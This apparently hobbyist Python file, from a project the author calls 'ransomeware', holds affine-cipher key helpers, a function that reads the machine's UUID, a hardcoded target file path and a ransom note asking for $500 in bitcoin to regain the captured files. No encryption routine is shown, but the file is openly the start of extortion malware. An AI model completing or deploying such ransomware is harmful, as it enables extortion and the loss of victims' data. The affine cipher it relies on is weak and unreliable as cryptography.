import sys, cryptomath, random, uuid

SYMBOLS = """ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\] ^_`abcdefghijklmnopqrstuvwxyz{|}~"""
file = '/Users/Fred/Desktop/projects/ransomeware/file/main.js'
warning = ('--->THIS FILE HAS BEEN CAPTURED. HELLO FRIEND.<---\n'
           + '--->If you wish to purge the encryption and regain the files then follow the instructions.<---\n'
           + '--->Send $500 to this bitcoin address:<---\n'
           + '--->df6ds7fg7dfghagf7fga8gfdghad7g<---\n'
           + '--->You will then regain the file and we will be gone.<---\n'
           + '\n')


def offset(even, rails, rail):
    if rail == 0 or rail == rails -1:
        return (rails -1) * 2
    if even:
        return 2 * rail
    else:
        return 2*(rails - 1 -rail)

def getKeyParts(key):
    keyA = key // len(SYMBOLS)
    keyB = key % len(SYMBOLS)
    return (keyA, keyB)

def getRandomKey():
     while True:
         keyA = random.randint(2, len(SYMBOLS))
         keyB = random.randint(2, len(SYMBOLS))
         if cryptomath.gcd(keyA, len(SYMBOLS)) == 1:
             return keyA * len(SYMBOLS) + keyB

def checkKeys(keyA, keyB, mode):
     if keyA == 1 and mode == 'encrypt':
         sys.exit('The affine cipher becomes incredibly weak when key A is set to 1. Choose a different key.')
     if keyB == 0 and mode == 'encrypt':
         sys.exit('The affine cipher becomes incredibly weak when key B is set to 0. Choose a different key.')
     if keyA < 0 or keyB < 0 or keyB > len(SYMBOLS) - 1:
         sys.exit('Key A must be greater than 0 and Key B must be between 0 and %s.' % (len(SYMBOLS) - 1))
     if cryptomath.gcd(keyA, len(SYMBOLS)) != 1:
         sys.exit('Key A (%s) and the symbol set size (%s) are not relatively prime. Choose a different key.' % (keyA, len(SYMBOLS)))

def getUID():
    return uuid.UUID(int=uuid.getnode())